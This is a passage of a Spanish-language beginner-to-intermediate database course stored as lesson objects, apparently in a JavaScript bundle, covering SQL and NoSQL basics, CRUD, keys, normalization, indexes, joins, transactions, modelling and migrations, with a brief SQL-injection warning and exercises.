SQL significa *Structured Query Language*. Son las bases de datos "de toda la vida" (aunque siguen siendo las ms usadas).
*   **Basadas en Tablas:** Todo se organiza en filas y columnas.
*   **Esquema Rgido:** Antes de guardar nada, tienes que definir qu vas a guardar (el "Plano").
*   **Relaciones:** Son excelentes conectando datos de diferentes tablas (ej: Conectar un \`Pedido\` con un \`Cliente\`).
*   **Ejemplos:** MySQL, PostgreSQL, SQLite, SQL Server.

## 2. NoSQL (No Relacionales)
Surgen para manejar grandes volmenes de datos y cambios rpidos. No usan tablas (normalmente).
*   **Tipos:** Documentos (como JSON), Clave-Valor (como Redis), Grafos o Columnar.
*   **Esquema Flexible:** Puedes guardar un usuario con 2 campos y otro con 20 en la misma coleccin.
*   **Escalabilidad:** Muy fciles de repartir en muchos servidores.
*   **Ejemplos:** MongoDB (Documentos), Redis (Clave-Valor), Cassandra.

## 3. Cundo usar cada una?

### Usa SQL si:
*   Tus datos son consistentes y predecibles.
*   Necesitas transacciones complejas (como transferencias bancarias).
*   La integridad de los datos es vital (que nada se pierda ni se duplique).

### Usa NoSQL si:
*   Ests prototipando rpido y tus datos cambian mucho.
*   Manejas datos masivos o en tiempo real (Big Data).
*   Tus datos no tienen una estructura clara entre s.

---

## Mini Ejercicio
Investiga en Google qu base de datos usa **Instagram**. Es SQL o NoSQL? (Spoiler: Usan un poco de ambas para diferentes cosas!).
`,completed:!1},{id:"db-junior-tablas-registros",title:"Tablas, Registros y Campos (El ABC de SQL)",level:"junior",content:'# Leccin 4: Tablas, Registros y Campos (El ABC de SQL)\n\nEn el mundo SQL, los datos viven en **Tablas**. Es el concepto ms importante que debes dominar.\n\n## 1. La Tabla\nEs la entidad general. Por ejemplo, una tabla llamada `Usuarios`.\n\n## 2. Los Campos (Columnas)\nDefine **qu tipo** de informacin guardamos. Cada columna tiene un nombre y un tipo de dato (Texto, Nmero, Fecha).\n*   **Nombre de columna:** `email`, `edad`, `fecha_registro`.\n*   **Tipo de dato:** `VARCHAR` (texto), `INT` (entero), `DATE`.\n\n## 3. Los Registros (Filas)\nEs la informacin de un objeto concreto. Una fila es un "Usuario" real.\n*   **Fila 1:** `juan@mail.com`, `25`, `2023-01-01`.\n*   **Fila 2:** `ana@mail.com`, `30`, `2023-05-10`.\n\n## Ejemplo Visual\n| id | nombre | email | es_premium |\n| :--- | :--- | :--- | :--- |\n| 1 | Carlos | carlos@... | true |\n| 2 | Marta | marta@... | false |\n\n*   **Tabla:** Clientes.\n*   **Campo:** `nombre`.\n*   **Registro:** La fila nmero 2 completa.\n\n---\n\n## Mini Ejercicio\nDisea mentalmente una tabla para un `Videojuego`. Qu columnas (campos) le pondras? Intenta que cada campo tenga un tipo (ej: `puntuacion` -> nmero, `nombre` -> texto).\n',completed:!1},{id:"db-junior-claves-relaciones",title:"Claves Primarias y Forneas (Relaciones)",level:"junior",content:`# Leccin 5: Claves Primarias y Forneas (Relaciones)

Cmo sabe la base de datos que el Pedido #50 es de Juan y no de Pedro? Para conectar tablas usamos **Keys** (Llaves).

## 1. Primary Key (PK) - Clave Primaria
Es el identificador nico de cada registro. No puede haber dos iguales en la misma tabla.
*   Pinsalo como el **DNI** o la huella dactilar.
*   Suele llamarse simplemente \`id\`.

## 2. Foreign Key (FK) - Clave Fornea
Es una clave primaria de otra tabla que ponemos en la tabla actual para crear una relacin.
*   Es el "link" o vnculo.

## Ejemplo de Relacin:
Imagina dos tablas: \`Autores\` y \`Libros\`.

**Tabla Autores:**
| id (PK) | nombre |
| :--- | :--- |
| **1** | Stephen King |
| **2** | J.K. Rowling |

**Tabla Libros:**
| id (PK) | titulo | autor_id (FK) |
| :--- | :--- | :--- |
| 10 | It | **1** |
| 11 | Harry Potter | **2** |

En la tabla \`Libros\`, el campo \`autor_id\` es una **Clave Fornea** que apunta a la **Clave Primaria** de la tabla \`Autores\`. As sabemos quin escribi qu!

## 3. Tipos de Relaciones
*   **Uno a Muchos (1:N):** Un Autor tiene muchos Libros (el ejemplo de arriba).
*   **Muchos a Muchos (N:N):** Un Estudiante tiene muchas Materias, y una Materia tiene muchos Estudiantes.
*   **Uno a Uno (1:1):** Un Usuario tiene un solo Perfil.

---

## Mini Ejercicio
En una aplicacin de msica, cules seran las PK y FK para relacionar una tabla de \`Artistas\` con una tabla de \`Canciones\`?
`,completed:!1},{id:"db-junior-intro-sql",title:"Introduccin a SQL (Hablando con la DB)",level:"junior",content:`# Leccin 6: Introduccin a SQL (Hablando con la DB)

SQL no es un lenguaje de programacin como JavaScript; es un lenguaje de **vnculo**. T no le dices a la base de datos *cmo* hacer las cosas (con bucles), le dices *qu* quieres obtener.

## 1. Cmo se lee?
Las sentencias SQL parecen frases en ingls. Son declarativas.

## 2. La Sentencia Bsica
El 90% del tiempo estars usando el comando \`SELECT\`.

\`\`\`sql
SELECT nombre, email FROM usuarios;
\`\`\`
Esto se traduce como: *"Selecciona los campos nombre y email de la tabla usuarios"*.

## 3. Filtrando con WHERE
No siempre quieres todos los datos. Quieres filtrar.
\`\`\`sql
SELECT * FROM usuarios WHERE pais = 'Argentina';
\`\`\`
El \`*\` significa "todas las columnas".

## 4. Tipos de Comandos (Bsico)
*   **DDL (Data Definition):** Para crear la estructura (ej: \`CREATE TABLE\`). Es como construir el armario.
*   **DML (Data Manipulation):** Para mover los datos dentro (ej: \`SELECT\`, \`INSERT\`). Es como meter o sacar ropa del armario.

---

## Mini Ejercicio
Si quieres buscar a todos los usuarios mayores de 18 aos, cmo crees que terminara la frase SQL? 
\`SELECT * FROM usuarios WHERE edad ...\`
`,completed:!1},{id:"db-junior-sentencias-basicas",title:"Operaciones CRUD (SELECT, INSERT, UPDATE, DELETE)",level:"junior",content:`# Leccin 7: Operaciones CRUD (SELECT, INSERT, UPDATE, DELETE)

El ciclo de vida de cualquier dato se resume en 4 acciones: **Crear, Leer, Actualizar y Borrar**.

## 1. SELECT (Leer)
Ya lo vimos. Se usa para consultar.
\`\`\`sql
SELECT titulo FROM peliculas ORDER BY anio DESC;
\`\`\`

## 2. INSERT (Crear)
Se usa para agregar nuevas filas a la tabla.
\`\`\`sql
INSERT INTO productos (nombre, precio) VALUES ('Teclado Gamer', 15000);
\`\`\`

## 3. UPDATE (Actualizar)
 **CUIDADO!** Si olvidas el \`WHERE\`, actualizars a TODOS los registros de la tabla.
\`\`\`sql
-- Cambia el precio solo del producto con id 1
UPDATE productos SET precio = 18000 WHERE id = 1;

--  Error fatal: Cambia el precio de todos los productos de la tienda a 0
UPDATE productos SET precio = 0; 
\`\`\`

## 4. DELETE (Borrar)
 **DOBLE CUIDADO!** Al igual que UPDATE, un DELETE sin \`WHERE\` vaca tu tabla por completo.
\`\`\`sql
DELETE FROM productos WHERE stock = 0;
\`\`\`

---

## Mini Ejercicio
Ests creando una red social. Un usuario decide cambiar su nombre de "Juan" a "Juan El Mejor". Qu comando usaras para este cambio? (SELECT, INSERT, UPDATE o DELETE).
`,completed:!1},{id:"db-junior-intro-nosql",title:"Introduccin a NoSQL (Flexibilidad al Poder)",level:"junior",content:`# Leccin 8: Introduccin a NoSQL (Flexibilidad al Poder)

Si vienes de JavaScript, las bases de datos NoSQL basadas en documentos (como **MongoDB**) te resultarn muy naturales porque se parecen mucho a los objetos JSON.

## 1. Adis a las Tablas rgidas
En NoSQL no hablamos de tablas, sino de **Colecciones**. Y no hablamos de filas, sino de **Documentos**.

## 2. El Documento
Un documento es prcticamente un objeto JSON.
\`\`\`json
{
  "_id": "507f1f77bcf86cd799439011",
  "nombre": "Sofia",
  "gustos": ["coding", "pizza", "netflix"],
  "direccion": {
    "ciudad": "Madrid",
    "calle": "Gran Via"
  }
}
\`\`\`

## 3. Por qu es genial para JS?
*   No necesitas convertir los datos: Tu frontend enva un JSON, tu backend recibe un objeto y tu base de datos guarda ese mismo objeto.
*   Puedes guardar arrays (\`gustos\`) u otros objetos (\`direccion\`) dentro del mismo registro sin necesidad de crear otras tablas y conexiones complejas.

## 4. NoSQL no es solo Documentos
Existen otros tipos:
*   **Clave-Valor:** Como un objeto gigante \`{ token: 'abc123' }\`. Muy rpido (ej: Redis).
*   **Grafos:** Para conexiones complejas (ej: Amigos de Facebook).

---

## Mini Ejercicio
Si tuvieras que guardar la informacin de un Carrito de Compras que tiene una lista de productos que cambia todo el tiempo, crees que sera ms fcil hacerlo en una tabla SQL o en un documento NoSQL? 
`,completed:!1},{id:"db-junior-documentos-colecciones",title:"Documentos y Colecciones (El ABC de MongoDB)",level:"junior",content:`# Leccin 9: Documentos y Colecciones (El ABC de MongoDB)

Si SQL era para personas que aman el orden y la estructura, NoSQL (especficamente las de documentos) es para personas que aman la velocidad y la flexibilidad.

## 1. La Coleccin
Es el grupo de datos. Equivale a la "Tabla". Por ejemplo, la coleccin \`Usuarios\`.

## 2. El Documento (Record)
Es el objeto individual. Equivale a la "Fila".

## 3. Esquema Flexible (Vaya con Dios)
A diferencia de SQL, aqu cada documento puede ser diferente.
\`\`\`json
// Documento 1
{ "nombre": "Marta", "twitter": "@marta_ok" }

// Documento 2 (En la misma coleccin)
{ "nombre": "Pedro", "telefono": 1234567, "es_admin": true }
\`\`\`
Esto en SQL es imposible sin alterar la tabla completa!

## 4. Cundo se vuelve esto un problema?
La flexibilidad es un arma de doble filo. Si no tienes cuidado, tu base de datos puede terminar llena de datos incoherentes (un usuario con el campo \`email\` y otro con el campo \`correo_electronico\`). Por eso, aunque la DB lo permita, solemos usar libreras como **Mongoose** en Node.js para forzar un poco de orden.

---

## Mini Ejercicio
Imagina una coleccin de \`Comentarios\`. Escribe en formato JSON cmo se vera un documento de un comentario que tenga: \`usuario\`, \`fecha\` y un array de \`likes\`.
`,completed:!1},{id:"db-junior-buenas-practicas",title:"Buenas Prcticas Bsicas",level:"junior",content:`# Leccin 10: Buenas Prcticas Bsicas

No importa si usas SQL o NoSQL, hay reglas de oro que todo desarrollador debe seguir para no odiar su vida en el futuro.

## 1. El ID es SAGRADO
Nunca uses un campo que pueda cambiar (como el \`email\` o el \`nombre\`) como clave primaria. Usa siempre un ID autogenerado nico.

## 2. Nombres Claros
Llama a tus tablas en plural (ej: \`usuarios\`) o singular (ej: \`usuario\`), pero **elige una forma y mantenla** en todo el proyecto. Lo mismo para los campos: usa \`snake_case\` o \`camelCase\`, pero no mezcles ambos.

## 3. Seguridad Ante Todo (SQL Injection)
Nunca metas directamente lo que el usuario escribe en tu sentencia SQL.
*   **Mal:** \`SELECT * FROM usuarios WHERE pass = '\` + input_del_usuario + \`'\`
*   **Bien:** Usa "Consultas Preparadas" o libreras (ORM) que limpien los datos por ti.

## 4. Backups (Copias de Seguridad)
Existen dos tipos de desarrolladores: los que hacen backups y los que todava no han perdido todos sus datos. Siempre automatiza una copia de tu base de datos.

## 5. No guardes contraseas en texto plano
**NUNCA** guardes \`contrasena: "123456"\`. Debes guardarlas encriptadas (usando Hashes) para que, si hackean tu base de datos, los atacantes no puedan leerlas.

---

## Desafo Junior
Has terminado el mdulo bsico. Ahora, intenta explicarle a alguien con tus propias palabras qu es una **Relacin Uno a Muchos** y pon un ejemplo de la vida real (que no sea el de Autores y Libros).

Felicidades! Tienes los cimientos para empezar a trabajar con el Backend 
`,completed:!1},{id:"db-junior-ejercicios",title:"Ejercicios Prcticos: Bases de Datos Junior",level:"junior",content:`# Ejercicios Prcticos: Bases de Datos Junior

Aplica los conceptos de SQL y NoSQL en escenarios del mundo real. Estos ejercicios te ayudarn a pensar como un desarrollador de backend.

---

## 1. Modelado de Tabla: La Biblioteca
**Objetivo:** Practicar la definicin de campos y tipos de datos.

**Consigna:**
Imagina que debes disear la tabla para una biblioteca. Define qu columnas tendra una tabla llamada \`libros\`.
*   Debes incluir al menos 6 campos (ej: id, ttulo, etc).
*   Para cada campo, indica qu **tipo de dato** usaras (Texto, Nmero, Fecha, Booleano).
*   Identifica cul campo sera la **Primary Key**.

**Resultado esperado:** Una lista clara de campos con sus tipos y restricciones bsicas.

---

## 2. CRUD SQL: El Videoclub
**Objetivo:** Escribir sentencias SQL bsicas.

**Consigna:**
Tienes una tabla llamada \`peliculas\` con los campos: \`id\`, \`titulo\`, \`genero\`, \`puntuacion\`.
Escribe el cdigo SQL para realizar las siguientes tareas:
1.  **Crear:** Inserta una nueva pelcula de terror llamada "El Faro" con una puntuacin de 9.
2.  **Leer:** Obtn solo los ttulos de las pelculas que tengan una puntuacin mayor a 8.
3.  **Actualizar:** Sube la puntuacin a 10 de la pelcula con \`id = 3\`.
4.  **Borrar:** Elimina todas las pelculas que sean del gnero 'Comedia'.

**Resultado esperado:** 4 bloques de cdigo SQL (\`INSERT\`, \`SELECT\`, \`UPDATE\`, \`DELETE\`).

---

## 3. Base de Datos para Usuarios: Perfiles Sociales
**Objetivo:** Entender la integridad de los datos y campos obligatorios.

**Consigna:**
Disea una tabla de \`usuarios\` para una red social.
*   Qu campos deberan ser nicos (\`UNIQUE\`)?
*   Qu campos no podran estar vacos (\`NOT NULL\`)?
*   Cmo guardaras la fecha de nacimiento para poder calcular la edad?
*   **Extra:** Qu tipo de dato usaras para guardar si la cuenta est verificada o no?

**Resultado esperado:** Un esquema de tabla detallando las reglas de cada columna.

---

## 4. Mini-Inventario NoSQL: Tienda de Electrnica
**Objetivo:** Practicar la estructura de documentos JSON.

**Consigna:**
Disea un **Documento NoSQL** (formato JSON) para un producto tecnolgico complejo (por ejemplo, un Smartphone).
*   Aprovecha la flexibilidad de NoSQL: incluye un array para las \`caracteristicas\` (ej: 5G, Bluetooth).
*   Incluye un objeto anidado para las \`especificaciones_tecnicas\` (ej: ram, procesador).
*   Simula cmo guardaras las valoraciones de los clientes (un array de objetos con \`usuario\` y \`puntos\`).

**Resultado esperado:** Un objeto JSON bien formado y anidado.

---

## 5. El Dilema del Arquitecto: Registro de Logins
**Objetivo:** Comparar SQL vs NoSQL segn el caso de uso.

**Consigna:**
Tu aplicacin necesita guardar un registro de cada vez que alguien inicia sesin (fecha, hora, IP, dispositivo).
*   Si planeas tener millones de estos registros al da y no necesitas relacionarlos con nada ms, qu tipo de base de datos usaras y por qu?
*   Si necesitas generar reportes mensuales exactos de seguridad y unir esos datos con la tabla de \`perfiles_de_seguridad\`, cambiara tu eleccin?

**Resultado esperado:** Una breve justificacin tcnica comparando ambas opciones para este caso especfico.

---

Manos a la obra! Dominar los datos es dominar el flujo de la aplicacin. 
`,completed:!1,isProject:!0},{id:"db-junior-evaluacion",title:"Evaluacin Bases de Datos Junior",level:"junior",content:`# Evaluacin Final: Bases de Datos Junior

Demuestra tu comprensin sobre cmo se almacena la informacin y las diferencias entre SQL y NoSQL.

## 1. Examen Terico
*   Qu es una Clave Primaria y por qu es obligatoria en cada tabla?
*   Menciona una ventaja de SQL sobre NoSQL y viceversa.
*   Qu riesgo corremos si ejecutamos un \`DELETE\` sin la clusula \`WHERE\`?

## 2. Desafo Prctico SQL: La Veterinaria
Imagina una tabla llamada \`mascotas\` con las columnas: \`id\`, \`nombre\`, \`especie\`, \`edad\`.
Escribe las sentencias SQL para:
1. Obtener los nombres de todas las mascotas que sean 'Perro'.
2. Insertar una nueva mascota: 'Luna', 'Gato', 2 aos.
3. Actualizar la edad de la mascota con id 5 a 3 aos.
4. Borrar a todas las mascotas mayores de 15 aos.

## 3. Desafo Prctico NoSQL: Catlogo de Juegos
Escribe en formato JSON cmo guardaras la informacin de un videojuego en una base de datos de documentos (NoSQL). Debe incluir:
*   Ttulo.
*   Gneros (un array).
*   Desarrollador (un objeto con nombre y pas).
*   Ao de lanzamiento.

## 4. Criterios de Aprobacin
* [ ] Distincin clara entre tablas/filas y colecciones/documentos.
* [ ] Sintaxis SQL bsica correcta.
* [ ] Estructura JSON vlida.
* [ ] Comprensin de las reglas de seguridad bsicas (hashes, SQL injection).
`,completed:!1,isProject:!0},{id:"db-semi-senior-normalizacion",title:"Normalizacin: Organizando el Caos",level:"semi-senior",content:'# Leccin 11: Normalizacin: Organizando el Caos\n\nLa normalizacin es el proceso de organizar los datos para reducir la redundancia y mejorar la integridad. A nivel Semi-Senior, ya no solo creas tablas; las diseas para que no se vuelvan un infierno de mantenimiento.\n\n## 1. El Problema de la Redundancia\nSi guardas el nombre y la direccin del cliente en cada fila de la tabla `Pedidos`, y el cliente cambia de direccin, tienes que actualizar 1,000 filas. Si olvidas una, tienes datos inconsistentes.\n\n## 2. Las Formas Normales (1NF, 2NF, 3NF)\n\n### Primera Forma Normal (1NF): Atomicidad\n*   Cada celda debe tener un solo valor.\n*   No puedes tener una columna `telefonos` con "123, 456, 789". Debes crear filas separadas o una tabla de telfonos.\n\n### Segunda Forma Normal (2NF): Dependencia Total\n*   Se aplica a tablas con claves compuestas. Todo campo que no sea clave debe depender de **toda** la clave primaria, no solo de una parte.\n\n### Tercera Forma Normal (3NF): Dependencia Transitiva\n*   Un campo no debe depender de otro campo que no sea la clave primaria.\n*   **Ejemplo Incorrecto:** Tabla `Libros` con `autor_id` y `autor_fecha_nacimiento`. El campo `autor_fecha_nacimiento` depende de `autor_id`, no del libro directamente. Mueve eso a una tabla `Autores`!\n\n## 3. Cundo NO normalizar? (Desnormalizacin)\nA veces, en sistemas de mucha lectura (como un catlogo de productos gigante), normalizar demasiado hace que las consultas sean lentas por tener demasiados JOINS. Un Semi-Senior sabe cundo romper las reglas por performance.\n\n---\n\n## Mini Ejercicio\nTienes una tabla `Factura` con los campos: `id`, `cliente_id`, `cliente_nombre`, `producto`, `precio`. Qu forma normal est rompiendo y cmo la separaras en dos tablas?\n',completed:!1},{id:"db-semi-senior-relaciones-avanzadas",title:"Relaciones y Asociaciones Avanzadas",level:"semi-senior",content:`# Leccin 12: Relaciones y Asociaciones Avanzadas

Entender cmo se conectan los datos es la base de un buen modelado.

## 1. El comodn: Muchos a Muchos (N:N)
SQL no permite de forma nativa una relacin N:N directa. Necesitamos una **Tabla Intermedia** (o Tabla de Unin).

### Ejemplo: Estudiantes y Cursos
*   Un estudiante se anota en muchos cursos.
*   Un curso tiene muchos estudiantes.

**Solucin:** Tabla \`inscripciones\`:
*   \`estudiante_id\` (FK)
*   \`curso_id\` (FK)
*   \`fecha_inscripcion\` (Aqu puedes guardar datos extras de la relacin).

## 2. Relaciones Recursivas
Ocurre cuando una tabla se relaciona consigo misma.
*   **Ejemplo:** Una tabla \`empleados\` donde la columna \`jefe_id\` apunta al \`id\` de otro empleado en la misma tabla.

## 3. Acciones en Cascada (\`ON DELETE\`)
Qu pasa con los Pedidos si borras al Cliente?
*   **CASCADE:** Se borran todos sus pedidos automticamente ( Peligroso).
*   **SET NULL:** Los pedidos se quedan sin dueo, pero no se borran.
*   **RESTRICT:** No te deja borrar al cliente mientras tenga pedidos asociados.

---

## Mini Ejercicio
Disea las tablas necesarias para un sistema de "Seguidores" de Twitter. Una persona puede seguir a muchas, y ser seguida por muchas. Cmo se llamara la tabla intermedia y qu campos tendra?
`,completed:!1},{id:"db-semi-senior-indices",title:"ndices: El Secreto de la Velocidad",level:"semi-senior",content:"# Leccin 13: ndices: El Secreto de la Velocidad\n\nUn ndice en una base de datos es como el ndice al final de un libro. No necesitas leer todo el libro para encontrar un tema; vas al ndice y saltas a la pgina exacta.\n\n## 1. El Costo de la Bsqueda\nSin ndice: La DB hace un **Full Table Scan** (lee fila por fila de 1 milln de registros).\nCon ndice: La DB encuentra el dato en milisegundos.\n\n## 2. Tipos de ndices\n*   **B-Tree (Por defecto):** Ideal para bsquedas de igualdad (`=`) y rangos (`>`, `<`).\n*   **Hash:** Muy rpido para comparaciones de igualdad exacta, pero no sirve para rangos.\n*   **Full-Text:** Especializado en buscar palabras dentro de textos largos.\n\n## 3. El Tradeoff (La Trampa)\nLos ndices no son gratis.\n*    Aceleran las lecturas (`SELECT`).\n*    Ralentizan las escrituras (`INSERT`, `UPDATE`, `DELETE`) porque la base de datos tiene que actualizar el ndice cada vez que cambias un dato.\n\n## 4. Cundo indexar?\nIndexa columnas que uses frecuentemente en tus clusulas `WHERE`, `JOIN` u `ORDER BY`. No indexes columnas que cambian constantemente o que tienen muy poca variedad de datos (ej: una columna `genero` con solo dos valores).\n\n---\n\n## Mini Ejercicio\nEn una tabla de 10 millones de `Usuarios`, sueles buscar siempre por `email` y a veces por `nombre`. A qu columnas le pondras un ndice?\n",completed:!1},{id:"db-semi-senior-consultas-complejas",title:"Consultas Complejas y Agregaciones",level:"semi-senior",content:`# Leccin 14: Consultas Complejas y Agregaciones

A medida que creces, ya no solo pides datos; haces preguntas de negocio a la base de datos.

## 1. Funciones de Agregacin
Calculan un valor a partir de un conjunto de filas:
*   \`COUNT()\`: Contar.
*   \`SUM()\`: Sumar valores.
*   \`AVG()\`: Promedio.
*   \`MAX()\` / \`MIN()\`: Valores extremos.

## 2. El Poder de \`GROUP BY\`
Permite agrupar filas que comparten el mismo valor en una columna.
\`\`\`sql
-- Cuntos pedidos ha hecho cada cliente?
SELECT cliente_id, COUNT(*) as total_pedidos 
FROM pedidos 
GROUP BY cliente_id;
\`\`\`

## 3. Filtrando Grupos con \`HAVING\`
A diferencia de \`WHERE\` (que filtra filas antes de agrupar), \`HAVING\` filtra despus de agrupar.
\`\`\`sql
-- Dame solo los clientes que han hecho ms de 5 pedidos
SELECT cliente_id, COUNT(*) as total 
FROM pedidos 
GROUP BY cliente_id 
HAVING COUNT(*) > 5;
\`\`\`

## 4. Subconsultas (Subqueries)
Una consulta dentro de otra.
\`\`\`sql
SELECT nombre FROM usuarios 
WHERE id IN (SELECT usuario_id FROM facturas WHERE monto > 1000);
\`\`\`

---

## Mini Ejercicio
Escribe el cdigo para obtener el precio promedio de todos los productos de la categora 'Electrnica'.
`,completed:!1},{id:"db-semi-senior-joins",title:"JOINS: Uniendo Mundos",level:"semi-senior",content:`# Leccin 15: JOINS: Uniendo Mundos

Los Joins permiten combinar filas de dos o ms tablas basndose en una columna relacionada.

## 1. INNER JOIN (El ms comn)
Devuelve registros que tienen valores coincidentes en ambas tablas. Si un cliente no tiene pedidos, no aparecer en el resultado.
\`\`\`sql
SELECT clientes.nombre, pedidos.fecha
FROM clientes
INNER JOIN pedidos ON clientes.id = pedidos.cliente_id;
\`\`\`

## 2. LEFT (OUTER) JOIN
Trae **todos** los registros de la tabla izquierda y los que coincidan de la derecha. Si no hay coincidencia, devuelve \`NULL\` en los campos de la derecha.
*   **Caso Real:** Ver una lista de todos tus clientes, incluso los que nunca han comprado nada.

## 3. RIGHT (OUTER) JOIN
Lo opuesto al anterior. Trae todo lo de la derecha. (Se usa menos, normalmente puedes lograr lo mismo invirtiendo el orden de las tablas en un LEFT JOIN).

## 4. FULL OUTER JOIN
Trae todo cuando hay una coincidencia en una de las tablas.

## 5. El peligro de los Joins masivos
Unir 5 tablas gigantes puede destruir la performance de tu servidor. Siempre revisa si tus columnas de unin (ON) estn indexadas.

---

## Mini Ejercicio
Tienes una tabla \`Artistas\` y una tabla \`Albunes\`. Quieres una lista de todos los artistas, y para los que tengan lbumes, mostrar el ttulo del lbum. Qu tipo de JOIN usaras?
`,completed:!1},{id:"db-semi-senior-transacciones",title:"Transacciones y el Concepto ACID",level:"semi-senior",content:`# Leccin 16: Transacciones y el Concepto ACID

En aplicaciones crticas (como un banco), no puedes permitir que los datos queden "a medias".

## 1. El Escenario del Desastre
Juan le transfiere $100 a Ana.
1. Restar $100 a Juan.
2. (Se cae el internet o se apaga el servidor )
3. Sumar $100 a Ana.

Resultado: Juan perdi dinero y Ana nunca lo recibi. El dinero desapareci del sistema.

## 2. La Solucin: Transacciones
Una transaccin es un conjunto de instrucciones que se tratan como una **unidad nica**. O se hacen todas, o no se hace ninguna.

\`\`\`sql
START TRANSACTION;
  UPDATE cuentas SET saldo = saldo - 100 WHERE usuario = 'Juan';
  UPDATE cuentas SET saldo = saldo + 100 WHERE usuario = 'Ana';
COMMIT; -- Guarda los cambios si todo sali bien
-- O usa ROLLBACK; si algo fall para deshacer todo
\`\`\`

## 3. ACID
Es el conjunto de propiedades que garantizan la fiabilidad:
*   **Atomicidad (Atomicity):** Todo o nada.
*   **Consistencia (Consistency):** La DB pasa de un estado vlido a otro estado vlido.
*   **Aislamiento (Isolation):** Dos transacciones al mismo tiempo no se molestan entre s.
*   **Durabilidad (Durability):** Una vez guardado, el cambio es permanente (aunque se corte la luz despus).

---

## Mini Ejercicio
En qu otro caso, aparte de una transferencia bancaria, crees que es vital usar una Transaccin?
`,completed:!1},{id:"db-semi-senior-modelado-sql",title:"Modelado SQL (Esquemas y Planificacin)",level:"semi-senior",content:`# Leccin 17: Modelado SQL (Esquemas y Planificacin)

Modelar en SQL es como construir un edificio: necesitas planos antes de poner el primer ladrillo.

## 1. Diagrama Entidad-Relacin (DER/ERD)
Antes de tocar el cdigo, dibujamos.
*   **Rectngulos:** Entidades (Tablas).
*   **Lneas:** Relaciones.
*   **Rombos:** Tipo de accin (opcional).

## 2. Estrategias de Claves Primarias
*   **ID Incremental (Serial):** \`1, 2, 3...\` Fcil de leer, pero revela cuntos datos tienes (un competidor puede saber cuntos pedidos vendes al da).
*   **UUID:** \`550e8400-e29b...\` Es un identificador nico universal de 36 caracteres. Imposible de adivinar y excelente para sistemas distribuidos.

## 3. Tipos de Datos Correctos
*   No uses \`TEXT\` para todo. Si es una edad, usa \`SMALLINT\`. Si es un precio, usa \`DECIMAL\` o \`NUMERIC\` (nunca \`FLOAT\` para dinero por errores de redondeo).
*   Usar el tipo correcto ahorra espacio y hace las bsquedas ms rpidas.

## 4. Soft Delete vs Hard Delete
Un Semi-Senior rara vez borra datos de verdad (\`Hard Delete\`).
*   **Soft Delete:** Agregas una columna \`deleted_at\`. Cuando el usuario "borra" algo, solo guardas la fecha. Tus consultas siempre filtran \`WHERE deleted_at IS NULL\`. Esto permite recuperar datos por error humano o auditora.

---

## Mini Ejercicio
Disea el esquema bsico (nombres de tablas y columnas principales) para un sistema de **Blog**. Debe haber Usuarios, Posts y Comentarios.
`,completed:!1},{id:"db-semi-senior-modelado-nosql",title:"Modelado NoSQL (Patrones y Documentos)",level:"semi-senior",content:`# Leccin 18: Modelado NoSQL (Patrones y Documentos)

En NoSQL, modelamos basndonos en cmo vamos a **leer** los datos, no en cmo los guardamos.

## 1. Embeber (Embedding) vs Referenciar (Referencing)

### Embeber (Dentro del mismo documento)
Guardas los datos relacionados dentro del objeto padre.
*    **Pros:** Lectura ultra rpida (una sola consulta).
*    **Contras:** El documento tiene un lmite de tamao (ej: 16MB en MongoDB). Los datos se repiten.
*   **Cundo usar:** Cuando los datos siempre se muestran juntos (ej: Direccin de un Usuario).

### Referenciar (Como el ID de SQL)
Guardas el ID del otro documento.
*    **Pros:** Datos consistentes y no repetidos.
*    **Contras:** Necesitas dos consultas (o un \`lookup/populate\`) lo cual es ms lento.
*   **Cundo usar:** Para datos que crecen mucho (ej: Seguidores de una cuenta).

## 2. El Anti-patrn del Crecimiento Infinito
Nunca metas un array que pueda crecer sin control dentro de un documento.
\`\`\`json
//  MAL: Si el post tiene 100,000 comentarios, el documento explotar.
{
  "titulo": "Mi Post",
  "comentarios": [ { ... }, { ... } ] 
}
\`\`\`

## 3. Atomicidad en NoSQL
A diferencia de SQL, muchas DB NoSQL solo garantizan que una operacin a **un solo documento** es atmica. Si cambias 3 documentos a la vez y falla a la mitad, quedas inconsistente. Tenlo en cuenta al disear.

---

## Mini Ejercicio
Para una aplicacin de **Recetas de Cocina**, los ingredientes de una receta, los "embeberas" o los "referenciaras" a otra coleccin? Justifica tu respuesta.
`,completed:!1},{id:"db-semi-senior-migraciones",title:"Migraciones de Datos y Evolucin del Esquema",level:"semi-senior",content:`# Leccin 19: Migraciones de Datos y Evolucin del Esquema

Las aplicaciones vivas cambian. Hoy tu usuario no tiene "telfono", maana es obligatorio. Cmo cambias la base de datos sin romper el sistema?

## 1. El concepto de Migracin
Una migracin es un archivo de cdigo que describe un cambio en la DB (Aadir columna, Crear tabla).
*   Se guardan en orden cronolgico (\`20230101_create_users.js\`, \`20230105_add_phone_to_users.js\`).
*   Permiten que todo el equipo tenga exactamente la misma estructura de DB.

## 2. Up y Down
Cada migracin suele tener dos funciones:
*   **UP:** El cambio que quieres hacer.
*   **DOWN:** Cmo deshacer ese cambio si algo sale mal (Rollback).

## 3. Migracin de Datos Activos
Cuando agregas un campo \`NOT NULL\` a una tabla que ya tiene 1 milln de filas, la DB fallar porque no sabe qu poner en el pasado.
*   **Paso 1:** Agregar columna permitiendo \`NULL\`.
*   **Paso 2:** Correr un script que llene los datos vacos con un valor por defecto.
*   **Paso 3:** Cambiar la columna a \`NOT NULL\`.

## 4. Herramientas Populares
*   **Sequelize / TypeORM / Prisma:** Para Node.js.
*   **Knex.js:** Para migraciones SQL puras.
*   **Flyway / Liquibase:** Herramientas de sistema.

---

## Mini Ejercicio
Por qu es peligroso borrar una columna de una base de datos en produccin directamente desde la consola sin usar un sistema de migraciones?
`,completed:!1},{id:"db-semi-senior-buenas-practicas-reales",title:"Buenas Prcticas Reales y Performance",level:"semi-senior",content:`# Leccin 20: Buenas Prcticas Reales y Performance

Un Semi-Senior no solo hace que funcione, hace que funcione bien bajo presin.

## 1. El problema del N+1
Es el error de performance ms comn.
*   **Junior:** Pido los 10 posts. Luego, por cada post, hago una nueva consulta a la DB para traer el nombre del autor. (Total: 11 consultas).
*   **Semi-Senior:** Uso un \`JOIN\` para traer los 10 posts con sus autores en una sola llamada. (Total: 1 consulta).

## 2. Paginacin: Nunca pidas "Todo"
Hacer un \`SELECT * FROM logs\` en una tabla con 50 millones de filas tumbar tu servidor.
Usa siempre \`LIMIT\` y \`OFFSET\` (o paginacin por cursores para mayor velocidad).

## 3. Vistas y Procedimientos Almacenados
*   **Views:** Son consultas guardadas que actan como tablas virtuales. tiles para ocultar complejidad.
